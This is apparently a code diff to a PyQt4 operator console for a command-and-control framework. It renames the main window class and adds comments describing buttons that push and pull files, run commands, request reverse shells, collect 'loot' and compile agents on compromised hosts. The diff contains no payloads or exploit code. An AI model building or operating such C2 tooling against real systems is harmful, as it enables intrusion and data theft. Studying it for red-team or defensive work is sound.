@@ -17,13 +17,17 @@ from PyQt4 import QtGui, QtCore
 # https://matplotlib.org/gallery/user_interfaces/embedding_in_qt_sgskip.html#sphx-glr-gallery-user-interfaces-embedding-in-qt-sgskip-py
 
 
-class TestMgr(QtGui.QMainWindow, design.Ui_MainWindow):
+class Manager(QtGui.QMainWindow, design.Ui_MainWindow):
     def __init__(self, parent=None):
-        super(TestMgr, self).__init__(parent)
+        # Initialize the GUI
+        super(Manager, self).__init__(parent)
         self.setupUi(self)
+
+        # Set color palette
         self.color = paletteColors.Colors()
         self.setPalette(self.color.pltActive)
 
+        # Set button tooltips
         self.PushFile.setToolTip("Push file to selected agent")
         self.PullFile.setToolTip("Download file from selected agent")
         self.ExecComm.setToolTip("Execute command on selected agent")
@@ -31,6 +35,7 @@ class TestMgr(QtGui.QMainWindow, design.Ui_MainWindow):
         self.GetLoot.setToolTip("Download all loot from selected agent")
         self.PushModule.setToolTip("Push and task a module to selected agent")
         
+        # Connect buttons to functions
         self.PushFile.clicked.connect(self.push_file)
         self.PullFile.clicked.connect(self.pull_file)
         self.ExecComm.clicked.connect(self.exec_comm)
@@ -43,16 +48,19 @@ class TestMgr(QtGui.QMainWindow, design.Ui_MainWindow):
         self.actionChange_C2_Server.triggered.connect(self.connect_to_c2)
         self.AgentList.currentItemChanged.connect(self.update_info_labels)
 
+        # Initialize the session and attempt to start a connection
         self.session = session.Session("127.0.0.1")
         self._show_connect_dialogue()
 
     def has_selection(self):
+        """ Determines if an agent is selected from AgentList"""
         if not self.AgentList.currentItem():
             reply = QtGui.QMessageBox.information(self, "No Target Selected", "Select a target from the list to use this option")
             return False
         return True
 
     def _show_connect_dialogue(self):
+        """Shows the server connection dialogue and initializes the agent list"""
         self.session = session.Session('127.0.0.1')
         self.AgentList.clear()
         dialog = dialogues.ConnectDialogue(self.session)
@@ -64,6 +72,7 @@ class TestMgr(QtGui.QMainWindow, design.Ui_MainWindow):
             self.AgentList.addItem(item)
 
     def update_info_labels(self):
+        """Updates the info labels when a new agent is clicked"""
         self.IP.setText("IP: " + self.AgentList.currentItem().data(QtCore.Qt.UserRole).ip)
         self.ConnectionTime.setText("Connection Time: " + self.AgentList.currentItem().data(QtCore.Qt.UserRole).connection_time)
         self.Hostname.setText("Hostname: " + self.AgentList.currentItem().data(QtCore.Qt.UserRole).hostname)
@@ -71,6 +80,7 @@ class TestMgr(QtGui.QMainWindow, design.Ui_MainWindow):
         self.ProcOwner.setText("Process Owner: " + self.AgentList.currentItem().data(QtCore.Qt.UserRole).process_owner)
         
     def connect_to_c2(self):
+        """Wrapper for _show_connect_dialogue which checks if the user really wants to"""
         reply = QtGui.QMessageBox.question(self, 'WARNING', 
                  'Switching C2 servers will reset all info in the console. Any active processes will be dropped. Continue?', 
                  QtGui.QMessageBox.Yes, QtGui.QMessageBox.No)
@@ -78,11 +88,13 @@ class TestMgr(QtGui.QMainWindow, design.Ui_MainWindow):
             self._show_connect_dialogue() 
 
     def open_term(self):
+        """Opens a local terminal"""
         diag = dialogues.TerminalWidget()
         diag.show()
         diag.exec()
 
     def push_file(self):
+        """Dialogue to push a file to server"""
         if not self.has_selection():
             return
         print("[ ] Waiting for file selection...")
@@ -90,24 +102,28 @@ class TestMgr(QtGui.QMainWindow, design.Ui_MainWindow):
         self.session.upload_file(self.AgentList.currentItem().text(), file)
 
     def pull_file(self):
+        """Dialogue to pull a file from an agent"""
         if not self.has_selection():
             return
         diag = dialogues.AgentDownloadDialogue(self.session, self.AgentList.currentItem().text())
         diag.exec()
 
     def exec_comm(self):
+        """Dialogue to task command for agent"""
         if not self.has_selection():
             return
         diag = dialogues.AgentCommandDialogue(self.session, self.AgentList.currentItem().text())
         diag.exec()
 
     def rev_sh(self):
+        """Dialogue to request reverse shell from agent"""
         if not self.has_selection():
             return
         
         print("Getting reverse shell")
     
     def get_loot(self):
+        """Dialogue to get all loot from an agent"""
         if not self.has_selection():
             return
         
@@ -115,23 +131,26 @@ class TestMgr(QtGui.QMainWindow, design.Ui_MainWindow):
         self.session.download_loot(self.AgentList.currentItem().text())
 
     def push_module(self):
+        """Dialogue to push a module to agent"""
         if not self.has_selection():
             return
         file = misc.open_file()
         self.session.push_module(self.AgentList.currentItem().text(), file)
 
     def get_client(self):
+        """Dialogue to get a compiled agent from server"""
         diag = dialogues.AgentCompileDialogue(self.session)
         diag.exec()
 
     def reg_client(self):
+        """Dialogue to register credentials with the server"""
         diag = dialogues.AgentRegisterDialogue(self.session)
         diag.exec()
         
 
 if __name__ == "__main__":
     app = QtGui.QApplication(sys.argv)
-    connect = TestMgr()
+    connect = Manager()
     connect.show()
     
     sys.exit(app.exec_())
